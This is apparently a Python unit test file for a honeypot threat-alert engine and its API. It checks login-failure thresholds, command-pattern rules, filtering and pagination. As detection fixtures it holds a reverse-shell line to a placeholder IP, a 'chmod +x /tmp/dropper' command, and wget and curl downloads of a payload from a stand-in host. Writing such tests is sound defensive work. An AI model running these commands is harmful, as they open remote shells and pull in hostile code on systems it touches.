import tempfile
import unittest
from pathlib import Path

import pandas as pd
from fastapi.testclient import TestClient

from api.main import create_app
from src import analysis, database
from src.parser import EVENT_COLUMNS
from src.sessionizer import build_sessions


def rows(ip, session, eventid, count=1, command=None, start="2026-01-01T10:00:00Z", username=None):
    return [
        {"id": index + 1, "timestamp": pd.Timestamp(start) + pd.Timedelta(seconds=index),
         "src_ip": ip, "session": session, "eventid": eventid,
         "username": username, "command": command}
        for index in range(count)
    ]


class TestThreatAlertEngine(unittest.TestCase):
    def test_failed_login_thresholds_and_session_aggregation(self):
        self.assertEqual(analysis.generate_threat_alerts(
            pd.DataFrame(rows("192.0.2.1", "s1", "cowrie.login.failed", 4))
        ), [])
        medium = analysis.generate_threat_alerts(
            pd.DataFrame(rows("192.0.2.1", "s1", "cowrie.login.failed", 5, username="root"))
        )
        self.assertEqual(len(medium), 1)
        self.assertEqual(medium[0]["severity"], "Medium")
        self.assertEqual(medium[0]["event_count"], 5)
        self.assertEqual(medium[0]["evidence"]["failed_login_count"], 5)
        self.assertEqual(medium[0]["session_ids"], ["s1"])
        high = analysis.generate_threat_alerts(
            pd.DataFrame(rows("192.0.2.1", "s1", "cowrie.login.failed", 10))
        )
        self.assertEqual(high[0]["severity"], "High")
        self.assertIn("10 or more", high[0]["severity_rationale"])

    def test_successful_honeypot_login_and_command_rule_severity(self):
        success = analysis.generate_threat_alerts(pd.DataFrame(
            rows("192.0.2.1", "s1", "cowrie.login.success", username="root")
        ))
        self.assertEqual(success[0]["rule_id"], "successful_honeypot_login")
        self.assertEqual(success[0]["severity"], "High")
        self.assertIn("honeypot", success[0]["rule_name"].lower())
        self.assertIn("does not establish", success[0]["assessment_note"])

        medium = analysis.generate_threat_alerts(pd.DataFrame(
            rows("192.0.2.2", "s2", "cowrie.command.input", command="chmod +x /tmp/dropper")
        ))
        self.assertEqual(medium[0]["rule_id"], "suspicious_command_pattern")
        self.assertEqual(medium[0]["severity"], "Medium")
        high = analysis.generate_threat_alerts(pd.DataFrame(
            rows("192.0.2.3", "s3", "cowrie.command.input",
                 command="bash -i >& /dev/tcp/192.0.2.9/4444")
        ))
        self.assertEqual(high[0]["severity"], "High")

    def test_download_activity_aggregation_dedup_and_stable_ids(self):
        data = rows("192.0.2.4", "s4", "cowrie.command.input", 3,
                    command="wget https://example.test/payload")
        first = analysis.generate_threat_alerts(pd.DataFrame(data))
        shuffled = analysis.generate_threat_alerts(pd.DataFrame(data).sample(frac=1, random_state=7))
        self.assertEqual(len(first), 1)
        self.assertEqual(first[0]["rule_id"], "download_tool_activity")
        self.assertEqual(first[0]["severity"], "Medium")
        self.assertEqual(first[0]["event_count"], 3)
        self.assertEqual(first, shuffled)

    def test_missing_fields_and_empty_data(self):
        self.assertEqual(analysis.generate_threat_alerts(pd.DataFrame()), [])
        self.assertEqual(
            analysis.generate_threat_alerts(pd.DataFrame({"eventid": ["cowrie.login.success"]})),
            [],
        )
        alert = analysis.generate_threat_alerts(pd.DataFrame([
            {"src_ip": "192.0.2.5", "eventid": "cowrie.login.success", "timestamp": None}
        ]))[0]
        self.assertIsNone(alert["first_seen"])
        self.assertEqual(alert["session_ids"], [])


class TestThreatAlertAPI(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.db = Path(self.temp.name) / "alerts.db"
        database.init_db(reset=True, db_path=self.db)
        event_rows = rows("192.0.2.10", "failed-session", "cowrie.login.failed", 10, username="root")
        event_rows += rows("192.0.2.10", "failed-session", "cowrie.login.success", username="root",
                           start="2026-01-01T10:01:00Z")
        event_rows += rows("198.51.100.20", "download-session", "cowrie.command.input",
                           command="curl https://example.test/x", start="2026-01-02T10:00:00Z")
        events = pd.DataFrame(event_rows)
        events["timestamp"] = pd.to_datetime(events["timestamp"], utc=True)
        events = events.reindex(columns=EVENT_COLUMNS)
        database.load_events(events, db_path=self.db)
        database.load_sessions(build_sessions(events), db_path=self.db)
        analysis.save_table(
            "session_clusters",
            pd.DataFrame([
                {"session": "failed-session", "behavior": "Login Activity"},
                {"session": "download-session", "behavior": "Command Activity"},
            ]),
            db_path=self.db,
        )
        self.client = TestClient(create_app(db_path=self.db))

    def tearDown(self):
        self.temp.cleanup()

    def test_filters_pagination_and_alert_detail(self):
        listing = self.client.get("/api/alerts", params={
            "severity": "Medium", "rule_id": "download_tool_activity",
            "source_ip": "198.51.100.20", "start": "2026-01-02",
            "end": "2026-01-02", "behavior": "Command Activity", "limit": 1,
        })
        self.assertEqual(listing.status_code, 200)
        result = listing.json()
        self.assertEqual(result["total"], 1)
        self.assertFalse(result["has_more"])
        alert = result["items"][0]
        self.assertEqual(alert["rule_id"], "download_tool_activity")
        self.assertEqual(alert["source_ip"], "198.51.100.20")
        self.assertEqual(len(result["rule_catalog"]), 4)

        detail = self.client.get(
            f"/api/alerts/{alert['alert_id']}",
            params={"start": "2026-01-02", "behavior": "Command Activity"},
        )
        self.assertEqual(detail.status_code, 200)
        self.assertEqual(detail.json()["evidence"]["download_tools_observed"], ["curl"])
        self.assertEqual(self.client.get("/api/alerts/missing").status_code, 404)

    def test_date_and_behavior_filters_and_empty_results(self):
        filtered = self.client.get("/api/alerts", params={
            "start": "2026-01-01", "end": "2026-01-01", "behavior": "Login Activity",
            "source_ip": "192.0.2.10",
        }).json()
        self.assertEqual({alert["rule_id"] for alert in filtered["items"]},
                         {"repeated_failed_logins", "successful_honeypot_login"})
        self.assertEqual(filtered["total"], 2)
        self.assertEqual(
            self.client.get("/api/alerts", params={"severity": "Low"}).status_code,
            422,
        )
        empty = self.client.get("/api/alerts", params={"start": "2026-02-01"}).json()
        self.assertEqual(empty["items"], [])
        self.assertEqual(empty["total"], 0)

    def test_alert_list_pagination_and_severity_boundary(self):
        first = self.client.get("/api/alerts", params={"limit": 1, "offset": 0}).json()
        second = self.client.get("/api/alerts", params={"limit": 1, "offset": 1}).json()
        self.assertEqual(first["total"], 3)
        self.assertEqual(len(first["items"]), 1)
        self.assertTrue(first["has_more"])
        self.assertEqual(second["offset"], 1)
        self.assertNotEqual(first["items"][0]["alert_id"], second["items"][0]["alert_id"])
        self.assertEqual(
            self.client.get("/api/alerts", params={"limit": 101}).status_code,
            422,
        )


if __name__ == "__main__":
    unittest.main()
